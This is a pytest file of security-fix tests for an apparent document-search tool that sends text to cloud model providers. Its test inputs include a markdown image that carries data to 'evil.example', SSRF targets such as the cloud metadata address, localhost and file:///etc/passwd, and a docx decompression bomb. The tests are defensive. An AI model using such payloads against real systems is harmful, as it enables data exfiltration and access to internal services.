"""Fixes from the security review: public-only fetching, bounded reading, no auto-loading images, personal-document consent."""
import io
import time
import zipfile

import pytest

import candidate
import safetext
import settings
import webfetch
from conftest import make_index
from engine import Engine
from ingest import Chunk
from providers.fake import FakeProvider


# ---------------------------------------------------------------- images in model text
def test_images_are_replaced_by_their_alt_text():
    t = "See ![chart](https://evil.example/x?d=CV) and ![r][1] and <img src='https://e/x'> done."
    out = safetext.strip_images(t)
    assert "evil.example" not in out and "<img" not in out and "[image removed: chart]" in out
    assert safetext.strip_images("A [link](https://ok.example) stays.") == "A [link](https://ok.example) stays."


# ---------------------------------------------------------------- add by URL
def fake_dns(monkeypatch, ip):
    monkeypatch.setattr(webfetch.socket, "getaddrinfo", lambda host, port, **k: [(2, 1, 6, "", (ip, port))])


@pytest.mark.parametrize("ip", ["127.0.0.1", "10.0.0.5", "192.168.1.1", "169.254.169.254", "::1", "172.16.0.9"])
def test_private_addresses_are_refused(monkeypatch, ip):
    fake_dns(monkeypatch, ip)
    with pytest.raises(ValueError, match="private network"):
        webfetch.check_public("https://anything.example/page")


def test_public_address_and_odd_ports_and_schemes(monkeypatch):
    fake_dns(monkeypatch, "93.184.216.34")
    webfetch.check_public("https://example.org/a")
    with pytest.raises(ValueError):
        webfetch.check_public("https://example.org:8080/a")
    with pytest.raises(ValueError):
        webfetch.check_public("file:///etc/passwd")
    with pytest.raises(ValueError):
        webfetch.check_public("ftp://example.org/a")


class Resp:
    def __init__(self, status=200, headers=None, chunks=(b"<html>hi</html>",)):
        self.status_code, self.headers, self._c = status, headers or {"Content-Type": "text/html"}, chunks
        self.is_redirect = status in (301, 302, 303, 307, 308)
    def raise_for_status(self): pass
    def iter_content(self, n): yield from self._c
    def close(self): pass


def test_a_redirect_to_a_private_address_is_refused(monkeypatch):
    answers = iter(["93.184.216.34", "127.0.0.1"])
    monkeypatch.setattr(webfetch.socket, "getaddrinfo", lambda host, port, **k: [(2, 1, 6, "", (next(answers), port))])
    monkeypatch.setattr(webfetch.requests, "get", lambda *a, **k: Resp(302, {"Location": "http://localhost/admin"}))
    with pytest.raises(ValueError, match="private network"):
        webfetch.fetch("https://example.org/start")


def test_fetch_returns_public_page_and_limits_size_and_type(monkeypatch):
    fake_dns(monkeypatch, "93.184.216.34")
    monkeypatch.setattr(webfetch.requests, "get", lambda *a, **k: Resp(chunks=(b"x" * 100,) * 10))
    body, final = webfetch.fetch("https://example.org/a", max_bytes=250)
    assert len(body) == 250 and final == "https://example.org/a"
    monkeypatch.setattr(webfetch.requests, "get", lambda *a, **k: Resp(headers={"Content-Type": "application/zip"}))
    with pytest.raises(ValueError, match="not a web page"):
        webfetch.fetch("https://example.org/a")


# ---------------------------------------------------------------- reading files
def docx_with(text_bytes: int) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>" + "a" * text_bytes + "</w:t></w:r></w:p></w:body></w:document>")
    return buf.getvalue()


def test_a_docx_that_unpacks_to_a_huge_text_is_refused_without_reading_it():
    bomb = docx_with(candidate.MAX_DOCX_XML + 1000)
    assert len(bomb) < 100_000, "the test file should be small compressed"
    with pytest.raises(ValueError, match="more text"):
        candidate.docx_text(bomb)
    assert candidate.docx_text(docx_with(2000)).startswith("aaa")


def test_redaction_still_works_and_cannot_be_made_to_hang():
    assert "hunter2hunter2" not in settings.redact('password = "hunter2hunter2"')
    assert "abc123def456" not in settings.redact("api_key: abc123def456")
    for nasty in ("auth" * 5000, "a" * 20000, "http" * 5000, "x" * 100000):
        t = time.perf_counter()
        settings.redact(nasty)
        assert time.perf_counter() - t < 1.0, nasty[:8]


# ---------------------------------------------------------------- personal documents
@pytest.fixture
def personal_engine(cfg):
    chunks = [Chunk("p1", "local", "profile/profile.md", "profile/profile.md", "Built a harmonization model. Python and PyTorch.", section="Experience"),
              Chunk("l1", "local", "library/n.md", "library/n.md", "General notes about python pytorch.", section="Notes")]
    provs = {"claude": FakeProvider(label="claude", locality="cloud"), "gemini": FakeProvider(label="gemini", locality="cloud"),
             "ollama": FakeProvider(label="ollama", locality="local")}
    return Engine(cfg, make_index(chunks), provs), provs


def test_claude_gets_personal_documents_without_a_question(personal_engine):
    eng, provs = personal_engine
    def boom(req): raise AssertionError("no prompt expected for Claude")
    r = eng.ask("python pytorch experience", mode="claude", consent=boom)
    assert r.answers and provs["claude"].calls


def test_gemini_needs_consent_before_it_sees_personal_documents(personal_engine):
    eng, provs = personal_engine
    seen = []
    def cancel(req):
        seen.append(req)
        assert not any(p.calls for p in provs.values()), "a provider was called before the user chose"
        return None
    r = eng.ask("python pytorch experience", mode="gemini", consent=cancel)
    assert r.cancelled and seen[0].kind == "personal" and "profile/profile.md" in seen[0].files and not provs["gemini"].calls


def test_compare_asks_again_and_only_the_chosen_provider_gets_the_documents(personal_engine):
    eng, provs = personal_engine
    r = eng.ask("python pytorch experience", mode="compare", consent=lambda req: ["claude"])
    assert provs["claude"].calls and not provs["gemini"].calls


def test_more_patient_folder_names_and_imaging_types_are_never_read():
    from pathlib import Path
    for p in ("proj/patient data/x.txt", "proj/Patient-Data-v2/x.txt", "proj/patientdata_old/x"):
        assert settings.in_hard_excluded(Path(p)), p
    assert not settings.in_hard_excluded(Path("proj/patience/x.txt"))
    for ext in (".img", ".mnc", ".mat", ".parquet"):
        assert settings.never_read("scan" + ext)


def test_walk_does_not_enter_a_patient_folder_with_a_longer_name(tmp_path):
    import ingest
    (tmp_path / "patient-data-v2").mkdir()
    (tmp_path / "patient-data-v2" / "secret.md").write_text("private")
    (tmp_path / "ok.md").write_text("fine")
    names = [p.name for p in ingest.walk_files(tmp_path, settings.load_config())]
    assert names == ["ok.md"]
